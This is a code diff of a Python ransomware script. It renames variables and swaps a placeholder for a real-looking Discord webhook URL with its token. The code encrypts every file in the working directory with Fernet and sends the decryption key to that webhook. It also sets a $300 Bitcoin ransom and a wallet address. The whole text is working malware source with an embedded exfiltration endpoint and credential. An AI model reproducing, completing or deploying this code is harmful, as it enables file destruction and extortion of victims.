@@ -10,12 +10,12 @@ from colorama import Fore, Back, Style
 
 class ransomwareEncrypt:
     def __init__(self):
-        self.files = []
+        self._fileToEncrypt = []
         self.keyGen = Fernet.generate_key()
         self.priceToAsk = "$300"
         self.wallet_url = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
         self.currency = "Bitcoin"
-        self.dc_webhook = DiscordWebhook("ENTER YOUR WEBHOOK URL HERE TO GET THE KEY")
+        self.dc_webhook = DiscordWebhook("https://canary.discord.com/api/webhooks/979584793601777664/YDIODdyyITuflKWlqlKtvnxDeAxaRI6bXRGrJ4gUFyW7yV6pp3rwRignY7dpPIVzwNCI")
 
     def encrypt_files(self):
         classRedirect = ransomwareEncrypt()
@@ -28,21 +28,21 @@ class ransomwareEncrypt:
             # If the computes file is not encrypted so let's encrypt it.
             # Create file to compare and check if encryption already exist 
             checkEncryptionFile = open("encryptionCheck.txt", "w+")
-            for file in os.listdir():
-                if file == 'ransomware.py' or file == 'rkey.key' or file == 'encryptionCheck.txt' or file == 'requirements.txt' or file == 'setup.py':
+            for fileInPath in os.listdir():
+                if fileInPath == 'ransomware.py' or fileInPath == 'rkey.key' or fileInPath == 'encryptionCheck.txt' or fileInPath == 'requirements.txt' or fileInPath == 'setup.py':
                     continue
-                if os.path.isfile(file):
-                        self.files.append(file)
+                if os.path.isfile(fileInPath):
+                        self._fileToEncrypt.append(fileInPath)
             #key = Fernet.generate_key()
             _keyDecode = self.keyGen.decode("utf-8")
             with open("rkey.key", "wb") as thekey:
                 thekey.write(self.keyGen)
-            for file in self.files:
-                    with open(file, "rb") as thefile:
-                        contents = thefile.read()
+            for fileInPath in self._fileToEncrypt:
+                    with open(fileInPath, "rb") as _newFileInPath:
+                        contents = _newFileInPath.read()
                     contents_encrypted = Fernet(self.keyGen).encrypt(contents)
-                    with open(file, "wb") as thefile:
-                        thefile.write(contents_encrypted)
+                    with open(fileInPath, "wb") as _newFileInPath:
+                        _newFileInPath.write(contents_encrypted)
             classRedirect.discord_webhook(_keyDecode)
 
     def decrypt_files(self):
@@ -83,17 +83,17 @@ class ransomwareEncrypt:
                     time.sleep(2)
                     continue
                 else:
-                    for file in os.listdir():
-                        if file == 'ransomware.py' or file == 'rkey.key' or file == 'encryptionCheck.txt' or file == 'requirements.txt' or file == 'setup.py':
+                    for fileInPath in os.listdir():
+                        if fileInPath == 'ransomware.py' or fileInPath == 'rkey.key' or fileInPath == 'encryptionCheck.txt' or fileInPath == 'requirements.txt' or fileInPath == 'setup.py':
                             continue
-                        if os.path.isfile(file):
-                            self.files.append(file)
-                    for file in self.files:
-                            with open(file, "rb") as thefile:
-                                contents = thefile.read()
+                        if os.path.isfile(fileInPath):
+                            self._fileToEncrypt.append(fileInPath)
+                    for fileInPath in self._fileToEncrypt:
+                            with open(fileInPath, "rb") as _newFileInPath:
+                                contents = _newFileInPath.read()
                             contents_decrypted = Fernet(w).decrypt(contents)
-                            with open(file, "wb") as thefile:
-                                thefile.write(contents_decrypted) 
+                            with open(fileInPath, "wb") as _newFileInPath:
+                                _newFileInPath.write(contents_decrypted) 
                             if os.path.exists("encryptionCheck.txt"):
                                 os.remove("encryptionCheck.txt")
                             else:
